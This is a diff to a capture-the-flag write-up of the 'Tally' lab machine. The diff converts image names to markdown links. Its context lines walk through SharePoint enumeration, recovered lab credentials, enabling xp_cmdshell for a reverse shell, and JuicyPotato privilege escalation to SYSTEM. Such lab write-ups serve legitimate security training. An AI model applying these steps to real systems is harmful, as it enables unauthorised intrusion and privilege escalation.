@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Tally.png
+![Tally.png](../assets/tally_assets/Tally.png)
 
 ### Enumeration
 
@@ -135,7 +135,7 @@ Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
 
 Navigating to the page on port 80 we find ourselves in a SharePoint page:
 
-site.png
+![site.png](../assets/tally_assets/site.png)
 
 We can kick off a GoBuster scan against the site to discover more directories. Because we are pentesting sharepoint specifically I'll use a specialized list from seclists:
 
@@ -146,11 +146,11 @@ We can kick off a GoBuster scan against the site to discover more directories. B
 
 This dumps a TON of information to sift through, and after a lot of trial and error we finally find http://10.10.10.59/_layouts/15/viewlsts.aspx which has some content we can take a look at. 
 
-view.png
+![view.png](../assets/tally_assets/view.png)
 
 Taking a look in the Documents folder we find an interesting file. We can go ahead and download this and open in in LibreOffice.
 
-ftp_creds.png
+![ftp_creds.png](../assets/tally_assets/ftp_creds.png)
 
 Cool, looks like we've found an FTP password, but still don't have a username for it. 
 
@@ -158,7 +158,7 @@ We can then navigate to Site Pages where we find another clue. Note: for some re
 
 Checking out the Finance Team page we discover 4 potential usernames:
 
-finance.png
+![finance.png](../assets/tally_assets/finance.png)
 
 We can now use these credentials to login to FTP:
 
@@ -213,11 +213,11 @@ Finance:Acc0unting
 
 Lets use these creds to access SMB and see whatelse we can find. 
 
-smb.png
+![smb.png](../assets/tally_assets/smb.png)
 
 In `\zz_Archived\SQL\` we find an interesting file called conn-info.txt, using `get` to bring it back to our machine, we find yet another pair of credentials:
 
-sa.png
+![sa.png](../assets/tally_assets/sa.png)
 
 Hmm, looks like these credentials aren't working anywhere. Lets keep enumerating SMB.
 
@@ -248,23 +248,23 @@ For more information type '\warranty'
 
 Because we're the sa user, lets enable xp_cmdshell so we can get a shell:
 
-sql.png
+![sql.png](../assets/tally_assets/sql.png)
 
 ### Exploitation
 
 Now that xp_cmdshell is enable and we can execute commands, I can head over to https://www.revshells.com/ and grab a base64 encoded reverse shell, set up a listener, and catch a shell back as user Sarah:
 
-sql_shell.png
+![sql_shell.png](../assets/tally_assets/sql_shell.png)
 
 We can now grab the user.txt flag and also check out the todo.txt file in Sarah's Desktop:
 
-user_flag.png
+![user_flag.png](../assets/tally_assets/user_flag.png)
 
 ### Privilege Escalation 
 
 Once on the box and after a bit more and saw that sarah had SeImpersonatePrivilege enabled. 
 
-priv.png
+![priv.png](../assets/tally_assets/pric.png)
 
 Lets try JuicyPotato to escalate privileges:
 
@@ -290,7 +290,7 @@ PS C:\users\Sarah\Desktop> C:\Users\Sarah\Desktop\JuicyPotato.exe -l 444 -p C:\U
 
 And caught a shell back as nt authority\system!
 
-jp.png
+![jp.png](../assets/tally_assets/jp.png)
 
 Thanks for following along!
 
